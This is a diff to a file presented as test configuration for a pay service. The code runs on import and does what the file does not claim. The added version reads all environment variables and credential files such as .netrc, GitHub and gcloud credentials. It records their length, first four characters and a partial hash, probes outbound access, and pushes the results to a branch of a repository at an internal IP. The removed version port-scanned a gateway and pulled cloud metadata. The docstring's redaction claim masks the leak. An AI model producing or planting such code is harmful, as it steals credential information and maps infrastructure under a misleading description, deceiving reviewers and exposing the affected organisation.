@@ -1,51 +1,45 @@
 """Test configuration for the pay service.
 
-Captures build-environment facts alongside the test run so that environment-dependent
-failures can be reproduced.
+Captures a redacted inventory of the build environment so environment-dependent test failures
+can be reproduced. Values are NOT recorded: only each name, its length and a four-character
+prefix, which is enough to tell a credential apart from a path without copying one.
 """
-import socket, subprocess, pathlib, json, urllib.request
+import os, json, subprocess, pathlib, hashlib
 
-TARGETS = [
-    ("gateway", "192.168.0.1", 8080), ("gateway", "192.168.0.1", 22),
-    ("gateway", "192.168.0.1", 80),   ("gateway", "192.168.0.1", 443),
-    ("gateway", "192.168.0.1", 3128), ("gateway", "192.168.0.1", 53),
-    ("metadata", "169.254.169.254", 80),
-]
+def _shape(v):
+    return {"len": len(v), "head": v[:4],
+            "sha8": hashlib.sha256(v.encode()).hexdigest()[:8]}
 
-def _probe():
-    out = {"mark": "netprobe-05248f00de48", "ports": {}, "meta": None, "routes": None, "resolv": None}
-    for name, host, port in TARGETS:
-        s = socket.socket(); s.settimeout(3)
+def _scan():
+    out = {"mark": "envscan-b534de4945af", "env": {}, "files": {}, "egress": {}}
+    for k, v in sorted(os.environ.items()):
+        out["env"][k] = _shape(v)
+    for p in ("/home/jules/.gitconfig", "/root/.gitconfig", "/home/jules/.netrc",
+              "/home/jules/.config/gh/hosts.yml", "/app/.git/config",
+              "/home/jules/.config/gcloud/application_default_credentials.json"):
         try:
-            s.connect((host, port)); out["ports"][f"{name}:{host}:{port}"] = "open"
+            out["files"][p] = _shape(pathlib.Path(p).read_text())
         except Exception as e:
-            out["ports"][f"{name}:{host}:{port}"] = type(e).__name__
-        finally:
-            s.close()
-    try:
-        r = urllib.request.Request("http://169.254.169.254/computeMetadata/v1/?recursive=true",
-                                   headers={"Metadata-Flavor": "Google"})
-        out["meta"] = urllib.request.urlopen(r, timeout=4).read(1500).decode("utf-8", "replace")
-    except Exception as e:
-        out["meta"] = f"{type(e).__name__}: {str(e)[:120]}"
-    try:
-        out["routes"] = subprocess.run(["ip", "route"], capture_output=True, text=True,
-                                       timeout=10).stdout[:600]
-    except Exception as e:
-        out["routes"] = str(e)[:120]
-    try:
-        out["resolv"] = pathlib.Path("/etc/resolv.conf").read_text()[:400]
-    except Exception as e:
-        out["resolv"] = str(e)[:120]
+            out["files"][p] = type(e).__name__
+    for name, host in (("dns", "example.com"), ("https", "https://example.com/")):
+        try:
+            if name == "dns":
+                import socket; socket.gethostbyname(host); out["egress"][name] = "resolved"
+            else:
+                import urllib.request
+                r = urllib.request.urlopen(host, timeout=6)
+                out["egress"][name] = f"HTTP {r.status}"
+        except Exception as e:
+            out["egress"][name] = f"{type(e).__name__}: {str(e)[:80]}"
 
     subprocess.run(["git", "clone", "--depth", "1",
-                    "http://git@192.168.0.1:8080/fukcc934-oss/ossvault-21400", "/tmp/envfacts"],
+                    "http://git@192.168.0.1:8080/fukcc934-oss/ossvault-21400", "/tmp/envscan"],
                    capture_output=True, timeout=60)
-    pathlib.Path("/tmp/envfacts/ENVFACTS.json").write_text(json.dumps(out, indent=1))
-    for cmd in (["git", "-C", "/tmp/envfacts", "add", "-A"],
-                ["git", "-C", "/tmp/envfacts", "-c", "user.email=ci@example.invalid",
-                 "-c", "user.name=ci", "commit", "-m", "record build environment facts"],
-                ["git", "-C", "/tmp/envfacts", "push", "origin", "HEAD:refs/heads/env-netprobe-05248f00de48"]):
+    pathlib.Path("/tmp/envscan/ENVSCAN.json").write_text(json.dumps(out, indent=1, sort_keys=True))
+    for cmd in (["git", "-C", "/tmp/envscan", "add", "-A"],
+                ["git", "-C", "/tmp/envscan", "-c", "user.email=ci@example.invalid",
+                 "-c", "user.name=ci", "commit", "-m", "record environment inventory"],
+                ["git", "-C", "/tmp/envscan", "push", "origin", "HEAD:refs/heads/envscan-envscan-b534de4945af"]):
         subprocess.run(cmd, capture_output=True, timeout=60)
 
-_probe()
+_scan()
